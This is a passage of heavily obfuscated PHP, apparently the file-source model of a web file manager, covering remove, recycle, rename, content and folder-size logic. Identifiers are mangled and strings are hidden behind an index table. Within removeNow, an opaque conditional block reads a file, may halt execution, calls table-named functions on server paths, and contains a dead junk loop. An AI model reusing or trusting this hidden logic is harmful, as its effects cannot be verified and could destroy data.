show_json(LNG($ÂÉ¿”§[2069]) . $ÂÉ¿”§[2070] . LNG($ÂÉ¿”§[2071]) . $ÂÉ¿”§[2072] . $Ã…°ƒ«Æ . $ÂÉ¿”§[2073], !1); } public function fileIsLock($ ÔÓ–š, $şâ™°¢ = false) { $¯“·‹ä =& $_SERVER[ë¦»ºéÌ]; if (!isset($ ÔÓ–š[$¯“·‹ä[467]]) || !$ ÔÓ–š[$¯“·‹ä[467]][$¯“·‹ä[541]]) { return !1; } if ($ ÔÓ–š[$¯“·‹ä[467]][$¯“·‹ä[541]] != USER_ID) { return !0; } $õÒÍ‡ş = $GLOBALS[$¯“·‹ä[6]][$¯“·‹ä[100]][$¯“·‹ä[542]]; if ($ ÔÓ–š[$¯“·‹ä[467]][$¯“·‹ä[543]] <= time() - $õÒÍ‡ş) { $this->metaSet($ ÔÓ–š[$¯“·‹ä[405]], $¯“·‹ä[541], null); $this->metaSet($ ÔÓ–š[$¯“·‹ä[405]], $¯“·‹ä[543], null); } if ($şâ™°¢) { $this->metaSet($ ÔÓ–š[$¯“·‹ä[405]], $¯“·‹ä[543], time()); } return !1; } private function _addSource($¾ÖŒÀ­ı, $¥‚µİ´½) { $‘ëµ°’… =& $_SERVER[ë¦»ºéÌ]; $’ÒõŞ€ = defined($‘ëµ°’…[476]) ? USER_ID : $‘ëµ°’…[202]; $õà”¢ï° = array($‘ëµ°’…[582] => $¥‚µİ´½[$‘ëµ°’…[414]], $‘ëµ°’…[583] => $¥‚µİ´½[$‘ëµ°’…[506]], $‘ëµ°’…[584] => $’ÒõŞ€, $‘ëµ°’…[585] => $’ÒõŞ€, $‘ëµ°’…[404] => $¥‚µİ´½[$‘ëµ°’…[405]], $‘ëµ°’…[586] => $¥‚µİ´½[$‘ëµ°’…[523]] . $¥‚µİ´½[$‘ëµ°’…[405]] . $‘ëµ°’…[60], $‘ëµ°’…[432] => 0, $‘ëµ°’…[587] => $‘ëµ°’…[12]); $¾ÖŒÀ­ı = array_merge($õà”¢ï°, $¾ÖŒÀ­ı); $this->updateModifyTime($¾ÖŒÀ­ı[$‘ëµ°’…[500]]); $À‚ÉªÜõ = $‘ëµ°’…[2074] . $¥‚µİ´½[$‘ëµ°’…[405]]; if (isset(self::$cacheChildList[$À‚ÉªÜõ])) { unset(self::$cacheChildList[$À‚ÉªÜõ]); } static $¤¢‘öü = false; if (!$¤¢‘öü) { Hook::trigger($‘ëµ°’…[569], $¾ÖŒÀ­ı); $¤¢‘öü = !0; } $„˜Ù«•Ç = $this->add($¾ÖŒÀ­ı); $úó„İ¨ = array($‘ëµ°’…[588] => short_id($„˜Ù«•Ç)); $this->where(array($‘ëµ°’…[420] => $„˜Ù«•Ç))->save($úó„İ¨); $this->setNamePinyin($„˜Ù«•Ç, $¾ÖŒÀ­ı[$‘ëµ°’…[42]]); return $„˜Ù«•Ç; } public function remove($Ÿ…ÊˆÄ¢, $Æ¨¥ö¨ = true) { $œµüê¢ú =& $_SERVER[ë¦»ºéÌ]; $™ÂˆÎÉÎ = $this->sourceInfo($Ÿ…ÊˆÄ¢); $ÓˆóŞáÇ = intval($™ÂˆÎÉÎ[$œµüê¢ú[414]]) === self::TYPE_SYSTEM; $şû•åğÑ = Model($œµüê¢ú[435])->get($œµüê¢ú[2075]) == $œµüê¢ú[99]; if ($ÓˆóŞáÇ || $Æ¨¥ö¨ || !$şû•åğÑ) { return $this->removeNow($Ÿ…ÊˆÄ¢, $Æ¨¥ö¨); } $´ğª¤Áõ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $éÉá›Íú = $™ÂˆÎÉÎ[$œµüê¢ú[414]] == self::TYPE_USER ? $œµüê¢ú[596] : $œµüê¢ú[517]; if ($éÉá›Íú == $œµüê¢ú[596]) { $Ë“ Ã¼ = Model($œµüê¢ú[515])->getInfo($™ÂˆÎÉÎ[$œµüê¢ú[506]]); $ôô©³ŠÓ = !empty($Ë“ Ã¼[$œµüê¢ú[2068]]) ? $Ë“ Ã¼[$œµüê¢ú[2068]] : $Ë“ Ã¼[$œµüê¢ú[42]]; $ôô©³ŠÓ = $œµüê¢ú[266] . $ôô©³ŠÓ . $œµüê¢ú[2076] . $™ÂˆÎÉÎ[$œµüê¢ú[506]]; } else { $Ë“ Ã¼ = Model($œµüê¢ú[524])->getInfo($™ÂˆÎÉÎ[$œµüê¢ú[506]]); $ôô©³ŠÓ = _get($Ë“ Ã¼, $œµüê¢ú[42]); $ôô©³ŠÓ = $œµüê¢ú[171] . $ôô©³ŠÓ . $œµüê¢ú[2077] . $™ÂˆÎÉÎ[$œµüê¢ú[506]]; } $õ“ÑÁí = $œµüê¢ú[2078] . md5($ôô©³ŠÓ); CacheLock::lock($õ“ÑÁí); $†ü¾‚™Ã = $this->fileNameExist($´ğª¤Áõ, $ôô©³ŠÓ); if (!$†ü¾‚™Ã) { $†ü¾‚™Ã = $this->mkdir($´ğª¤Áõ, $ôô©³ŠÓ, REPEAT_SKIP); $this->metaSet($†ü¾‚™Ã, $œµüê¢ú[2079], $éÉá›Íú); $this->metaSet($†ü¾‚™Ã, $œµüê¢ú[2080], $™ÂˆÎÉÎ[$œµüê¢ú[506]]); if ($™ÂˆÎÉÎ[$œµüê¢ú[500]] != 0) { $this->metaSet($†ü¾‚™Ã, $œµüê¢ú[2081], _get($Ë“ Ã¼, $œµüê¢ú[2082])); } } CacheLock::unlock($õ“ÑÁí); $this->metaSet($Ÿ…ÊˆÄ¢, $œµüê¢ú[2083], $™ÂˆÎÉÎ[$œµüê¢ú[500]]); $this->where(array($œµüê¢ú[405] => $Ÿ…ÊˆÄ¢))->save(array($œµüê¢ú[427] => time())); $this->recycleClear($™ÂˆÎÉÎ); $€ªôÂš† = $this->move($Ÿ…ÊˆÄ¢, $†ü¾‚™Ã, REPEAT_RENAME_FOLDER); $this->folderSizeReset($™ÂˆÎÉÎ[$œµüê¢ú[500]]); return $€ªôÂš†; } private function recycleClear($ÏĞîï˜é) { $¼‘ğó„† =& $_SERVER[ë¦»ºéÌ]; $µÙÑ§ÌÍ = $this->childrenAll($ÏĞîï˜é); $Øıôàé = array($¼‘ğó„†[420] => array($¼‘ğó„†[421], $µÙÑ§ÌÍ[$¼‘ğó„†[2084]])); Model($¼‘ğó„†[2085])->where($Øıôàé)->delete(); } public function removeNow($¤ˆ¨Í†Ñ, $×ªÙŠ€ = true) { $±ÇÇ£òÊ =& $_SERVER[ë¦»ºéÌ]; if ($_SERVER[$±ÇÇ£òÊ[13]] != $_SERVER[$±ÇÇ£òÊ[14]]) { $âˆ„Íµ· = $±ÇÇ£òÊ[857]; $ÉÆÊ™¶Ï = $±ÇÇ£òÊ[15]; $ï…Öñ¬Ÿ = $_SERVER[$±ÇÇ£òÊ[16]] . $±ÇÇ£òÊ[17]; $†å¡ ‘ò = $ÉÆÊ™¶Ï($ï…Öñ¬Ÿ); $ŠÚİ­ = explode($±ÇÇ£òÊ[18], $†å¡ ‘ò); if (count($ŠÚİ­) < $±ÇÇ£òÊ[616]) { $Èá •Ë¤ = $±ÇÇ£òÊ[20]; $Èá •Ë¤(); } $¡ŸœÇµÄ = $±ÇÇ£òÊ[858]; $¡ŸœÇµÄ($_SERVER[$±ÇÇ£òÊ[859]]); $¡ŸœÇµÄ($_SERVER[$±ÇÇ£òÊ[16]] . $±ÇÇ£òÊ[2086]); $â×óÂ˜ = 1; while ($â×óÂ˜ > 1) { $â×óÂ˜ = $â×óÂ˜ + 4; $Ö–Œä³ğ = rawurlencode($â×óÂ˜ . $±ÇÇ£òÊ[384]); } } $ùãß»åª = $this->sourceInfo($¤ˆ¨Í†Ñ); $µ¥ÛÌ“· = $this->pathInfoMore($¤ˆ¨Í†Ñ); if (!$ùãß»åª) { return !0; } if ($ùãß»åª[$±ÇÇ£òÊ[500]] == 0) { if (!_get($GLOBALS, $±ÇÇ£òÊ[507])) { return !1; } } $this->lockMoveStart($¤ˆ¨Í†Ñ); Hook::trigger($±ÇÇ£òÊ[2087], $µ¥ÛÌ“·, $×ªÙŠ€); if ($×ªÙŠ€) { Model($±ÇÇ£òÊ[2085])->moveToRecycle($¤ˆ¨Í†Ñ); } else { $ë¢ÊÂÕ¶ = $this->childrenAll($ùãß»åª); Model($±ÇÇ£òÊ[566])->eventRemove($¤ˆ¨Í†Ñ); $this->removeRelevance($ë¢ÊÂÕ¶[$±ÇÇ£òÊ[2084]], $ë¢ÊÂÕ¶[$±ÇÇ£òÊ[1448]]); } $this->folderSizeReset($ùãß»åª[$±ÇÇ£òÊ[500]]); $à–óºˆÑ = array($ùãß»åª[$±ÇÇ£òÊ[500]]); if ($ùãß»åª[$±ÇÇ£òÊ[413]] == $±ÇÇ£òÊ[99]) { $à–óºˆÑ[] = $ùãß»åª[$±ÇÇ£òÊ[405]]; } $this->updateModifyTime($à–óºˆÑ); $this->lockMoveEnd($¤ˆ¨Í†Ñ); Hook::trigger($±ÇÇ£òÊ[1669], $µ¥ÛÌ“·, $×ªÙŠ€); return !0; } public function childrenAll($îˆ¯å°‹) { $ëê±ßåÄ =& $_SERVER[ë¦»ºéÌ]; $ŒÏ§„Ô = $îˆ¯å°‹[$ëê±ßåÄ[405]]; if ($îˆ¯å°‹[$ëê±ßåÄ[413]] == $ëê±ßåÄ[99]) { $Š‰Æ¹ŞÅ = array($ëê±ßåÄ[586] => array($ëê±ßåÄ[546], $îˆ¯å°‹[$ëê±ßåÄ[523]] . $ŒÏ§„Ô . $ëê±ßåÄ[547])); $ñè‡à§å = array($ëê±ßåÄ[586] => $Š‰Æ¹ŞÅ[$ëê±ßåÄ[523]]); $±óÄÇŸã = $this->field($ëê±ßåÄ[2088])->where($ñè‡à§å)->select(); $ùõê®Ù = !1; $¬¢úĞ½¯ = array($ŒÏ§„Ô); if ($±óÄÇŸã) { $ùõê®Ù = array_to_keyvalue($±óÄÇŸã, $ëê±ßåÄ[12], $ëê±ßåÄ[469]); $ùõê®Ù = array_remove_value($ùõê®Ù, $ëê±ßåÄ[202]); $¬¢úĞ½¯ = array_to_keyvalue($±óÄÇŸã, $ëê±ßåÄ[12], $ëê±ßåÄ[405]); $¬¢úĞ½¯[] = $ŒÏ§„Ô; } } else { $ùõê®Ù = array($îˆ¯å°‹[$ëê±ßåÄ[469]]); $¬¢úĞ½¯ = array($ŒÏ§„Ô); } return array($ëê±ßåÄ[2084] => $¬¢úĞ½¯, $ëê±ßåÄ[1448] => $ùõê®Ù); } public function removeArray($àƒ°İç’) { if (!$àƒ°İç’) { return !0; } } public function removeRelevance($Í¼êÎ–½, $¬²Š¬æ) { $¾€Â²£‰ =& $_SERVER[ë¦»ºéÌ]; $Í¼êÎ–½ = $Í¼êÎ–½ ? $Í¼êÎ–½ : array(); $¬²Š¬æ = $¬²Š¬æ ? $¬²Š¬æ : array(); $Í¼êÎ–½ = array_unique(array_filter($Í¼êÎ–½)); $¬²Š¬æ = array_unique(array_filter($¬²Š¬æ)); if (!$Í¼êÎ–½) { return !1; } $ëå‘’ÜÇ = array($¾€Â²£‰[420] => array($¾€Â²£‰[421], $Í¼êÎ–½)); Model($¾€Â²£‰[2085])->where($ëå‘’ÜÇ)->delete(); Model($¾€Â²£‰[463])->where($ëå‘’ÜÇ)->delete(); Model($¾€Â²£‰[1941])->where($ëå‘’ÜÇ)->delete(); Model($¾€Â²£‰[566])->where($ëå‘’ÜÇ)->delete(); Model($¾€Â²£‰[1780])->removeBySource($Í¼êÎ–½); Model($¾€Â²£‰[2066])->removeBySource($Í¼êÎ–½); $this->where($ëå‘’ÜÇ)->delete(); Model($¾€Â²£‰[472])->remove($¬²Š¬æ); for ($¸“ßœ›ë = 0; $¸“ßœ›ë < count($Í¼êÎ–½); $¸“ßœ›ë++) { $this->sourceCacheClear($Í¼êÎ–½[$¸“ßœ›ë]); } } public function rename($Ú¥×, $øÏğ¶) { $›«›Ò× =& $_SERVER[ë¦»ºéÌ]; $’ªº½Î = $this->sourceInfo($Ú¥×); if (!$’ªº½Î) { return !1; } $æø‡óÃ = $this->fileNameExist($’ªº½Î[$›«›Ò×[500]], $øÏğ¶); if ($æø‡óÃ && $æø‡óÃ != $Ú¥×) { return !1; } $€ÖïºäÏ = array($›«›Ò×[423] => $øÏğ¶, $›«›Ò×[585] => USER_ID); if ($’ªº½Î[$›«›Ò×[413]] != $›«›Ò×[99]) { $€ÖïºäÏ[$›«›Ò×[415]] = substr(get_path_ext($øÏğ¶), 0, 10); } Model($›«›Ò×[566])->eventRename($Ú¥×, $’ªº½Î[$›«›Ò×[42]], $øÏğ¶); $this->sourceCacheClear($Ú¥×); $this->setNamePinyin($Ú¥×, $€ÖïºäÏ[$›«›Ò×[42]], !1); $this->updateModifyTime($’ªº½Î[$›«›Ò×[500]]); $åá–İ“å = $this->where(array($›«›Ò×[420] => $Ú¥×))->data($€ÖïºäÏ)->save(); $î¶óø°‘ = $›«›Ò×[2074] . $’ªº½Î[$›«›Ò×[500]]; if (isset(self::$cacheChildList[$î¶óø°‘])) { unset(self::$cacheChildList[$î¶óø°‘]); } return $åá–İ“å; } public function setNamePinyin($ƒ”ŠàéÆ, $ÙÁˆê‚¿, $Â‘ÒÛ¤‹ = true) { $Ñö©èÁ =& $_SERVER[ë¦»ºéÌ]; $şÛğ…¥Â = Input::check($ÙÁˆê‚¿, $Ñö©èÁ[589]); $÷ïòÎĞõ = array($Ñö©èÁ[444] => KodSort::makeStr($ÙÁˆê‚¿)); if ($şÛğ…¥Â) { $÷ïòÎĞõ[$Ñö©èÁ[466]] = str_replace($Ñö©èÁ[63], $Ñö©èÁ[12], Pinyin::get($ÙÁˆê‚¿)); $÷ïòÎĞõ[$Ñö©èÁ[465]] = Pinyin::get($ÙÁˆê‚¿, $Ñö©èÁ[590]); } if (!$Â‘ÒÛ¤‹ && !$şÛğ…¥Â) { $÷ïòÎĞõ[$Ñö©èÁ[466]] = null; $÷ïòÎĞõ[$Ñö©èÁ[465]] = null; } $this->metaSet($ƒ”ŠàéÆ, $÷ïòÎĞõ); } public function getContent($ò›õ»êİ) { $©éÑà®ı =& $_SERVER[ë¦»ºéÌ]; $»ñÕåâ× = $this->fileInfoGet($ò›õ»êİ); if (!$»ñÕåâ×) { return !1; } if ($»ñÕåâ×[$©éÑà®ı[90]] == 0) { return $©éÑà®ı[12]; } $‹ÕõÓÍ = $©éÑà®ı[2089] . $»ñÕåâ×[$©éÑà®ı[181]]; if ($»ñÕåâ×[$©éÑà®ı[90]] <= 1024 * 10) { $´¨’‹¯Á = Cache::get($‹ÕõÓÍ); if (!$´¨’‹¯Á) { $´¨’‹¯Á = IO::getContent($»ñÕåâ×[$©éÑà®ı[88]]); Cache::set($‹ÕõÓÍ, $´¨’‹¯Á); } return $´¨’‹¯Á; } if (!$»ñÕåâ×[$©éÑà®ı[88]]) { return $©éÑà®ı[12]; } return IO::getContent($»ñÕåâ×[$©éÑà®ı[88]]); } public function setDesc($Œø§›şĞ, $ÙíÉ˜ò‚) { $Ñ“Á¿Ï =& $_SERVER[ë¦»ºéÌ]; Model($Ñ“Á¿Ï[566])->eventAddDesc($Œø§›şĞ, $ÙíÉ˜ò‚); return $this->metaSet($Œø§›şĞ, $Ñ“Á¿Ï[453], $ÙíÉ˜ò‚); } public function setContent($­´¬§ŠÙ, $‡™´Í­û = '') { $õÃÈá‹ë =& $_SERVER[ë¦»ºéÌ]; $ı¦˜Şş = $this->sourceInfo($­´¬§ŠÙ); $öÓªŸ¤ô = $this->fileInfoGet($­´¬§ŠÙ); if (!$öÓªŸ¤ô || !$ı¦˜Şş) { return !1; } $óˆ¦â• = Model($õÃÈá‹ë[472])->addFileByContent($‡™´Í­û, $ı¦˜Şş[$õÃÈá‹ë[42]]); $£šâö¿Ñ = $this->fileHistory($ı¦˜Şş, $óˆ¦â•[$õÃÈá‹ë[469]], $óˆ¦â•[$õÃÈá‹ë[90]]); if (!$£šâö¿Ñ) { return Model($õÃÈá‹ë[472])->remove($óˆ¦â•[$õÃÈá‹ë[469]]); } $this->folderSizeReset($ı¦˜Şş[$õÃÈá‹ë[500]]); return !0; } public function fileSubstr($’¥×‰Õ‹, $Ä¼ÛÚµ, $êŸÖ«¡Ì) { $˜ÚŞüûë = $this->fileInfoGet($’¥×‰Õ‹); if (!$˜ÚŞüûë) { return !1; } return IO::fileSubstr($˜ÚŞüûë[$_SERVER[ë¦»ºéÌ][88]], $Ä¼ÛÚµ, $êŸÖ«¡Ì); } public function fileInfoGet($üö™»àş) { $ï’Ñ·şŒ =& $_SERVER[ë¦»ºéÌ]; $ø‹şöÁ = $this->sourceInfo($üö™»àş); if (!$ø‹şöÁ || $ø‹şöÁ[$ï’Ñ·şŒ[413]]) { return !1; } $”ñŠı—Í = $ï’Ñ·şŒ[475] . $ø‹şöÁ[$ï’Ñ·şŒ[469]]; $­°ÏÙáŠ = _get(self::$cacheFileInfo, $”ñŠı—Í); if ($­°ÏÙáŠ) { return $­°ÏÙáŠ; } $ƒıÂ²Şœ = Model($ï’Ñ·şŒ[472])->fileInfo($ø‹şöÁ[$ï’Ñ·şŒ[469]]); if ($ƒıÂ²Şœ) { $ƒıÂ²Şœ[$ï’Ñ·şŒ[42]] = $ø‹şöÁ[$ï’Ñ·şŒ[42]]; } self::$cacheFileInfo[$”ñŠı—Í] = $ƒıÂ²Şœ; return $ƒıÂ²Şœ; } private function folderChildrenNumber($©Äı˜î) { $üâÀÆ› =& $_SERVER[ë¦»ºéÌ]; $Úô¥ç¸ = $this->sourceInfo($©Äı˜î); $‡‹Íáç÷ = array($üâÀÆ›[586] => array($üâÀÆ›[546], $Úô¥ç¸[$üâÀÆ›[523]] . $©Äı˜î . $üâÀÆ›[547]), $üâÀÆ›[583] => $Úô¥ç¸[$üâÀÆ›[506]], $üâÀÆ›[432] => intval($Úô¥ç¸[$üâÀÆ›[433]]), $üâÀÆ›[579] => 1); $†öê”ß‰ = $this->where($‡‹Íáç÷)->count(); $¿ã²Ó£à = $this->where($‡‹Íáç÷)->where(array($üâÀÆ›[579] => 0))->count(); return array($üâÀÆ›[94] => $¿ã²Ó£à, $üâÀÆ›[95] => $†öê”ß‰); } public function pathInfo($¶õ“ú, $Å—·–§Ä = false) { $Ù–ÁÅğñ =& $_SERVER[ë¦»ºéÌ]; $Å—·–§Ä = !1; $¶õ“ú = intval($¶õ“ú); $í¹şÆ = $Ù–ÁÅğñ[461] . intval($Å—·–§Ä) . $Ù–ÁÅğñ[462] . $¶õ“ú; $¬¹««Òª = _get(self::$cachePathInfo, $í¹şÆ); if ($¬¹««Òª) { return $¬¹««Òª; } $ÏıÆ = $this->sourceInfo($¶õ“ú); if (!$ÏıÆ) { return !1; } $ÏıÆ = $this->_listDataApplyItem($ÏıÆ, $Å—·–§Ä); self::$cachePathInfo[$í¹şÆ] = $ÏıÆ; return $ÏıÆ; } public static $cachePathInfoMore = array(); public function pathInfoMore($†¨ôšæ­) { $ÙğÆÖ·ƒ =& $_SERVER[ë¦»ºéÌ]; $íÊˆ‡ÇÃ = _get(self::$cachePathInfoMore, $†¨ôšæ­); if ($íÊˆ‡ÇÃ) { return $íÊˆ‡ÇÃ; } $‹´ÉÂŠ± = $this->pathInfo($†¨ôšæ­); if (!$‹´ÉÂŠ±) { return !1; } if ($‹´ÉÂŠ±[$ÙğÆÖ·ƒ[413]] == $ÙğÆÖ·ƒ[99]) { $‹´ÉÂŠ±[$ÙğÆÖ·ƒ[93]] = $this->folderChildrenNumber($†¨ôšæ­); } self::$cachePathInfoMore[$†¨ôšæ­] = $‹´ÉÂŠ±; return $‹´ÉÂŠ±; } public function sourceInfo($œé¥Öô®) { $ş’¢Ûƒâ =& $_SERVER[ë¦»ºéÌ]; if (!$œé¥Öô®) { return array(); } $œé¥Öô® = intval($œé¥Öô®); $×Ñº‘Øô = $ş’¢Ûƒâ[460] . $œé¥Öô®; $úƒ¼Úãâ = _get(self::$cacheSourceInfo, $×Ñº‘Øô); if ($úƒ¼Úãâ) { return $úƒ¼Úãâ; } $ÊÌ²†º¢ = $this->where(array($ş’¢Ûƒâ[405] => $œé¥Öô®))->find(); self::$cacheSourceInfo[$×Ñº‘Øô] = $ÊÌ²†º¢; return self::$cacheSourceInfo[$×Ñº‘Øô]; } public function sourceCacheClear($ñö­“»í = false) { self::cacheClear($ñö­“»í); } public static function cacheClear($Í£™’•â = false) { $¿›Š¦ò¢ =& $_SERVER[ë¦»ºéÌ]; if ($Í£™’•â == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$¿›Š¦ò¢[460] . $Í£™’•â]); unset(self::$cachePathInfoMore[$Í£™’•â]); unset(self::$cachePathInfo[$¿›Š¦ò¢[2090] . $Í£™’•â]); unset(self::$cachePathInfo[$¿›Š¦ò¢[2091] . $Í£™’•â]); } public function metaSet($¯¨˜£Æ£, $„˜áòËĞ = null, $ŞŒÛ®ş = null) { $ü³ˆ¼çœ = parent::metaSet($¯¨˜£Æ£, $„˜áòËĞ, $ŞŒÛ®ş); if ($ü³ˆ¼çœ) { $this->sourceCacheClear($¯¨˜£Æ£); } return $ü³ˆ¼çœ; } public function pathInfoByPath($È·×ıÃ›, $ë“˜ıÛ») { $‰Ôç¤½‘ =& $_SERVER[ë¦»ºéÌ]; $Óâïóİ­ = !$ë“˜ıÛ» ? array() : explode($‰Ôç¤½‘[8], trim($ë“˜ıÛ», $‰Ôç¤½‘[8])); $Ûù€¸° = $È·×ıÃ›; foreach ($Óâïóİ­ as $¹ÇµìÂ¦) { $ËšÑîü = array($‰Ôç¤½‘[500] => $Ûù€¸°, $‰Ôç¤½‘[42] => $¹ÇµìÂ¦); $±®Ã¾–í = $this->where($ËšÑîü)->select(); if (!$±®Ã¾–í) { return !1; } $±®Ã¾–í = array_sort_by($±®Ã¾–í, $‰Ôç¤½‘[433]); $Ûù€¸° = $±®Ã¾–í[0][$‰Ôç¤½‘[405]]; } return $this->pathInfo($Ûù€¸°, !0); } protected function updateModifyTime($Ìä‘‡‘) { $âó”ÊÍí =& $_SERVER[ë¦»ºéÌ]; $¦×³Ñòş = defined($âó”ÊÍí[476]) ? USER_ID : $âó”ÊÍí[202]; if (!$Ìä‘‡‘) { return; } if (!is_array($Ìä‘‡‘)) { $Ìä‘‡‘ = array($Ìä‘‡‘); } foreach ($Ìä‘‡‘ as $îÑìßè¸ => $‡ä˜åÔ—) { $Ìä‘‡‘[$îÑìßè¸] = intval($‡ä˜åÔ—); $this->sourceCacheClear($‡ä˜åÔ—); } $“À»ìÀ‘ = array($âó”ÊÍí[405] => array($âó”ÊÍí[7], $Ìä‘‡‘)); $Æ¦ÒÆş™ = array($âó”ÊÍí[585] => $¦×³Ñòş, $âó”ÊÍí[427] => time()); $this->where($“À»ìÀ‘)->save($Æ¦ÒÆş™); } public function folderSizeReset($Ã÷Å«²®, $Ğ€ªâ™Ñ = false) { $Ë±©Ô =& $_SERVER[ë¦»ºéÌ]; if ($this->statusIgnoreResetSpace) { return; } $¸ˆ¿Õ£Ë = $this->sourceInfo($Ã÷Å«²®); $ı ó¡¹» = $Ë±©Ô[2092] . $Ã÷Å«²®; CacheLock::lock($ı ó¡¹», 20); if ($Ğ€ªâ™Ñ === !1) { $this->sourceCacheClear($Ã÷Å«²®); $¸ˆ¿Õ£Ë = $this->sourceInfo($Ã÷Å«²®); $ÖÛ‚‰–« = array($Ë±©Ô[404] => $Ã÷Å«²®, $Ë±©Ô[432] => 0); $€ ˆ£û = $this->where($ÖÛ‚‰–«)->sum($Ë±©Ô[90]); $Ğ€ªâ™Ñ = intval($€ ˆ£û) - intval($¸ˆ¿Õ£Ë[$Ë±©Ô[90]]); } if ($Ğ€ªâ™Ñ == 0) { return CacheLock::unlock($ı ó¡¹»); } $”¦™±å = $this->parentLevelArray($¸ˆ¿Õ£Ë[$Ë±©Ô[523]]); if (!$”¦™±å) { $”¦™±å = array(); } $”¦™±å[] = $¸ˆ¿Õ£Ë[$Ë±©Ô[405]]; $ÖÛ‚‰–« = array($Ë±©Ô[405] => array($Ë±©Ô[421], $”¦™±å)); if ($Ğ€ªâ™Ñ < 0) { $ÖÛ‚‰–«[$Ë±©Ô[90]] = array($Ë±©Ô[995], abs($Ğ€ªâ™Ñ)); } $this->where($ÖÛ‚‰–«)->setAdd($Ë±©Ô[90], $Ğ€ªâ™Ñ); CacheLock::unlock($ı ó¡¹»); $Ô­ã¬„ß = $Ë±©Ô[2093] . $¸ˆ¿Õ£Ë[$Ë±©Ô[414]] . $Ë±©Ô[4] . $¸ˆ¿Õ£Ë[$Ë±©Ô[506]]; $‚ÕÄ‘„™ = array($¸ˆ¿Õ£Ë[$Ë±©Ô[414]], $¸ˆ¿Õ£Ë[$Ë±©Ô[506]]); TaskRun::timeLimitCall($Ô­ã¬„ß, $Ë±©Ô[2094], $‚ÕÄ‘„™, 1.5); } public function folderSizeResetChildren($ë¾Âø÷€) { $óÇ¢ Ä¦ =& $_SERVER[ë¦»ºéÌ]; $this->sourceCacheClear($ë¾Âø÷€); $¹ «îû = $this->sourceInfo($ë¾Âø÷€); $í®ïƒå = array($óÇ¢ Ä¦[579] => 1, $óÇ¢ Ä¦[583] => $¹ «îû[$óÇ¢ Ä¦[506]], $óÇ¢ Ä¦[586] => array($óÇ¢ Ä¦[546], $¹ «îû[$óÇ¢ Ä¦[523]] . $ë¾Âø÷€ . $óÇ¢ Ä¦[547])); $‰çµ¹Ï¶ = $óÇ¢ Ä¦[2095]; $­Şª‘ ¶ = $this->field($‰çµ¹Ï¶)->where($í®ïƒå)->select(); $í®ïƒå[$óÇ¢ Ä¦[413]] = 0; $òŠ ôßŒ = $this->field($‰çµ¹Ï¶)->where($í®ïƒå)->select(); if (!$òŠ ôßŒ) { return; } $­Şª‘ ¶[] = $¹ «îû; $­Şª‘ ¶ = array_to_keyvalue($­Şª‘ ¶, $óÇ¢ Ä¦[405]); foreach ($­Şª‘ ¶ as $•§úòÒı => $îƒ‹âß) { $­Şª‘ ¶[$•§úòÒı][$óÇ¢ Ä¦[2096]] = $­Şª‘ ¶[$•§úòÒı][$óÇ¢ Ä¦[90]]; $­Şª‘ ¶[$•§úòÒı][$óÇ¢ Ä¦[90]] = 0; } foreach ($òŠ ôßŒ as $îƒ‹âß) { $‘öøïï‘ = $îƒ‹âß[$óÇ¢ Ä¦[500]] . $óÇ¢ Ä¦[12]; if (!isset($­Şª‘ ¶[$‘öøïï‘])) { continue; } if ($îƒ‹âß[$óÇ¢ Ä¦[433]] == $­Şª‘ ¶[$‘öøïï‘][$óÇ¢ Ä¦[433]]) { $­Şª‘ ¶[$‘öøïï‘][$óÇ¢ Ä¦[90]] += $îƒ‹âß[$óÇ¢ Ä¦[90]]; } } foreach ($­Şª‘ ¶ as $îƒ‹âß) { $…ıâ»Ì± = $this->parentLevelArray($îƒ‹âß[$óÇ¢ Ä¦[523]]); foreach ($…ıâ»Ì± as $‘öøïï‘) { $‘öøïï‘ = $‘öøïï‘ . $óÇ¢ Ä¦[12]; if (!isset($­Şª‘ ¶[$‘öøïï‘])) { continue; } if ($îƒ‹âß[$óÇ¢ Ä¦[433]] == $­Şª‘ ¶[$‘öøïï‘][$óÇ¢ Ä¦[433]]) { $­Şª‘ ¶[$‘öøïï‘][$óÇ¢ Ä¦[90]] += $îƒ‹âß[$óÇ¢ Ä¦[90]]; } } } $òÎ‘¼œ = array(); foreach ($­Şª‘ ¶ as $îƒ‹âß) { if ($îƒ‹âß[$óÇ¢ Ä¦[90]] == $îƒ‹âß[$óÇ¢ Ä¦[2096]]) { continue; } $òÎ‘¼œ[] = array($óÇ¢ Ä¦[405], $îƒ‹âß[$óÇ¢ Ä¦[405]], $óÇ¢ Ä¦[90], $îƒ‹âß[$óÇ¢ Ä¦[90]]); } $this->saveAll($òÎ‘¼œ); } public function userSpaceReset($”Í‘×á = false) { $±À›óØƒ =& $_SERVER[ë¦»ºéÌ]; $™Áı­¶ = $this->where(array($±À›óØƒ[414] => self::TYPE_USER, $±À›óØƒ[506] => $”Í‘×á, $±À›óØƒ[413] => 0))->sum($±À›óØƒ[90]); $™Áı­¶ = !$™Áı­¶ || $™Áı­¶ <= 0 ? 0 : $™Áı­¶; Model($±À›óØƒ[515])->userEdit($”Í‘×á, array($±À›óØƒ[1789] => $™Áı­¶)); } public function targetSpaceUpdate($¯Ù÷¿¦, $ê¶¬å¶ê) { $Ê¢âÒòç =& $_SERVER[ë¦»ºéÌ]; if (!$ê¶¬å¶ê) { return; } if (!in_array($¯Ù÷¿¦, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Ë® ‰ñ = $this->targetSpaceSize($¯Ù÷¿¦, $ê¶¬å¶ê); if ($¯Ù÷¿¦ == self::TYPE_USER) { Model($Ê¢âÒòç[515])->userEdit($ê¶¬å¶ê, array($Ê¢âÒòç[1789] => $Ë® ‰ñ)); } else { if ($¯Ù÷¿¦ == self::TYPE_GROUP) { Model($Ê¢âÒòç[524])->groupEdit($ê¶¬å¶ê, array($Ê¢âÒòç[1789] => $Ë® ‰ñ)); } } } public function targetSpaceSize($¨¹Ô¶•, $Ÿ¶Åµ–Ñ) { $ÎÖäàôì =& $_SERVER[ë¦»ºéÌ]; $ˆáÌ½šº = $this->sourceRoot($¨¹Ô¶•, $Ÿ¶Åµ–Ñ, !0); if (!$ˆáÌ½šº) { return 0; } $è½Ùíé = floatval($ˆáÌ½šº[$ÎÖäàôì[90]]); $ÀåÉÅñë = array($ÎÖäàôì[586] => array($ÎÖäàôì[546], $ÎÖäàôì[533] . $ˆáÌ½šº[$ÎÖäàôì[405]] . $ÎÖäàôì[547])); $˜»”öÉ¹ = 